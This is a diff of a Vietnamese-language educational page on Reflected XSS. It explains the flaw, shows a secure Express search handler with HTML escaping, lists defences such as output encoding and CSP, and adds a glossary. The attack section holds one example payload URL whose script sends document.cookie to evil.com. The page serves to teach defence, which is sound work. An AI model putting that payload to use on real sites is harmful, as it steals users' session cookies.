@@ -1,13 +1,10 @@
 # Reflected XSS
 
-> **OWASP Top 10:2025**: A05:2025 – Injection | **CWE**: CWE-79 (Improper Neutralization of Input During Web Page Generation) | **Phân loại**: XSS
+> **CWE**: CWE-79 (Improper Neutralization of Input During Web Page Generation) | **Phân loại**: Cross-Site Scripting
 
-## 🧱 Kiến thức Nền tảng
-Tham số truy vấn URL (URL query parameters) là tập hợp dữ liệu được đính kèm ở cuối đường dẫn URL sau dấu hỏi chấm `?`, dưới dạng các cặp khóa-giá trị (ví dụ: `?query=iphone`). Các tham số này thường được trình duyệt gửi lên máy chủ để chỉ định các hành động động như tìm kiếm, lọc dữ liệu hoặc phân trang.
+## Kiến thức Nền tảng
 
-Khi máy chủ nhận được yêu cầu HTTP, nó sẽ xử lý dữ liệu và sử dụng cơ chế dựng HTML phía máy chủ (server-side HTML rendering) để tạo ra trang tài liệu HTML động hoàn chỉnh trước khi gửi về lại cho trình duyệt client hiển thị. Lỗ hổng Reflected XSS (XSS phản xạ) xuất hiện khi máy chủ lấy trực tiếp giá trị của các tham số truy vấn từ yêu cầu HTTP này và chèn thẳng vào nội dung phản hồi HTML mà không tiến hành làm sạch hoặc mã hóa ký tự đặc biệt (HTML entity encoding).
-
-Nếu kẻ tấn công gửi cho nạn nhân một liên kết chứa mã kịch bản độc hại trong tham số truy vấn, máy chủ sẽ vô tình phản chiếu mã kịch bản đó vào trang HTML trả về. Trình duyệt của nạn nhân khi phân tích trang sẽ thực thi đoạn mã độc này vì coi đó là một phần hợp lệ của tài liệu được máy chủ cung cấp. Để phòng chống, mọi dữ liệu nhận từ tham số truy vấn khi dựng HTML phía máy chủ phải được mã hóa phù hợp theo ngữ cảnh (ví dụ: thay thế các ký tự nguy hiểm như `<`, `>`, `&`, `"`, `'` thành thực thể HTML tương ứng).
+Hãy tưởng tượng tham số truy vấn trên URL giống như một lời nhắn gửi kèm theo phong bì thư bạn gửi lên máy chủ (ví dụ: `?q=tin_tức`). Khi nhận được phong bì, máy chủ sẽ đọc lời nhắn này và dùng nó để tạo ra một trang phản hồi động (như trang kết quả tìm kiếm cho từ khóa "tin_tức") rồi gửi lại cho bạn. Tuy nhiên, nếu máy chủ này quá ngây thơ – nhận được lời nhắn thế nào liền in nguyên văn như thế lên trang phản hồi mà không thèm kiểm tra xem lời nhắn đó có chứa các ký tự nguy hiểm của ngôn ngữ HTML hay không – thì đó chính là nguồn cơn của lỗ hổng bảo mật.
 
 ### Code ví dụ hoạt động bình thường (Secure Server-Side Rendering)
 ```javascript
@@ -48,13 +45,16 @@ app.get('/search', (req, res) => {
 });
 ```
 
-## 🔍 Mô tả lỗ hổng
-Reflected XSS (XSS phản xạ) xảy ra khi dữ liệu đầu vào từ yêu cầu HTTP của người dùng được phản chiếu ngay lập tức trong phản hồi HTML của máy chủ mà không được mã hóa hoặc lọc ký tự phù hợp. Kẻ tấn công có thể chèn các đoạn mã JavaScript độc hại vào tham số truy vấn (URL) và gửi liên kết cho nạn nhân. Khi nạn nhân click vào liên kết, trình duyệt của họ tải trang phản hồi từ máy chủ và thực thi mã độc.
+## Mô tả lỗ hổng
 
-## ⚔️ Cơ chế tấn công
+Lỗ hổng Reflected XSS (XSS phản xạ) xảy ra khi máy chủ lấy dữ liệu từ yêu cầu gửi lên và "phản chiếu" ngay lập tức nó vào trang web trả về cho trình duyệt mà không qua bộ lọc an toàn. Kẻ tấn công sẽ tạo ra một đường dẫn URL chứa mã JavaScript độc hại ở phần tham số truy vấn rồi tìm cách lừa nạn nhân click vào đó. Khi nạn nhân bấm link, trình duyệt gửi yêu cầu lên máy chủ, máy chủ lập tức phản chiếu đoạn mã độc đó vào trang HTML trả về. Trình duyệt của nạn nhân nhận được trang web, tưởng đó là nội dung hợp lệ của hệ thống nên chạy mã độc ngay lập tức. Sự nguy hiểm của cuộc tấn công này nằm ở chỗ nó diễn ra tức thì và có thể dễ dàng giúp kẻ tấn công cướp quyền đăng nhập của người dùng chỉ qua một cú click chuột đơn giản.
+
+## Cơ chế tấn công
+
 Kẻ tấn công quan sát thấy một trang web hiển thị lại tham số tìm kiếm từ URL lên trang kết quả (ví dụ truy cập `http://site.com/search?q=banana` sẽ in ra dòng "Search results for: banana"). Chúng tạo một liên kết độc hại có dạng `http://site.com/search?q=<script>fetch('http://evil.com?c=' + document.cookie)</script>` và gửi cho nạn nhân qua email. Khi nạn nhân click, máy chủ của trang web nhận yêu cầu, chèn trực tiếp kịch bản script vào trang HTML trả về, khiến trình duyệt của nạn nhân chạy đoạn mã gửi cookie phiên làm việc của họ sang máy chủ của kẻ tấn công.
 
-## 🛡️ Biện pháp phòng thủ
+## Biện pháp phòng thủ
+
 - **Tóm tắt**: Phòng chống Reflected XSS bằng cách mã hóa dữ liệu đầu ra dựa theo ngữ cảnh hiển thị, kiểm tra kiểu dữ liệu đầu vào nghiêm ngặt và triển khai chính sách Content Security Policy (CSP).
 - **Các bước chi tiết**:
   - Thực hiện mã hóa đầu ra tương thích với ngữ cảnh (HTML body, thuộc tính HTML, kịch bản JavaScript, hoặc tham số URL) cho tất cả các dữ liệu do người dùng cung cấp trước khi trả về.
@@ -63,7 +63,8 @@ Kẻ tấn công quan sát thấy một trang web hiển thị lại tham số t
   - Sử dụng các framework hiện đại (React, Angular, Vue) có tích hợp sẵn cơ chế mã hóa đầu ra an toàn theo mặc định.
   - Thiết lập tiêu đề phản hồi `X-Content-Type-Options: nosniff` để ngăn chặn các cuộc tấn công khai thác MIME-sniffing.
 
-## 💻 Code Example
+## Code Example
+
 ```javascript
 const escapeHtml = (unsafeString) => {
     if (typeof unsafeString !== 'string') {
@@ -85,7 +86,18 @@ app.get('/search', (req, res) => {
 });
 ```
 
-## 📚 Ghi chú kỹ thuật & Nguồn tham khảo
-- **Trạng thái kiểm định**: FIXED
-- **Ghi chú kỹ thuật**: Đã sửa một lỗi logic nghiêm trọng trong Express JS: khi người dùng truyền tham số dạng mảng/đối tượng (như `?q[]=val`), việc gọi trực tiếp `.replace` trên đối tượng đó sẽ gây crash tiến trình (TypeError). Đồng thời, việc chuyển đổi ép kiểu bằng `String(unsafeString)` trên các đối tượng null-prototype cũng ném ra lỗi. Mã nguồn đã được sửa bằng cách bổ sung kiểm tra nghiêm ngặt `typeof unsafeString === 'string'` và xử lý loại trừ dữ liệu không phải chuỗi thô.
-- **Nguồn tham khảo**: OWASP XSS Cheat Sheet, PortSwigger, CWE-79
+## Xem thêm
+
+- [Stored XSS](../stored/) — Lỗ hổng XSS lưu trữ.
+
+## Nguồn tham khảo
+
+- OWASP XSS Cheat Sheet, PortSwigger, CWE-79
+
+## Giải thích thuật ngữ
+
+- **Reflected XSS**: Lỗ hổng XSS phản xạ, mã độc được gửi qua request và trả về ngay lập tức trong response của server.
+- **Query Parameter**: Tham số đi kèm trên đường dẫn URL để truyền tải dữ liệu.
+- **Server-Side Rendering**: Phương pháp dựng toàn bộ giao diện HTML động ngay trên máy chủ trước khi gửi về client.
+- **Payload**: Đoạn mã khai thác được kẻ tấn công chèn vào hệ thống.
+- **HTML Entity**: Ký tự mã hóa đặc biệt đại diện cho các thẻ HTML giúp trình duyệt không hiểu nhầm thành lệnh thực thi.
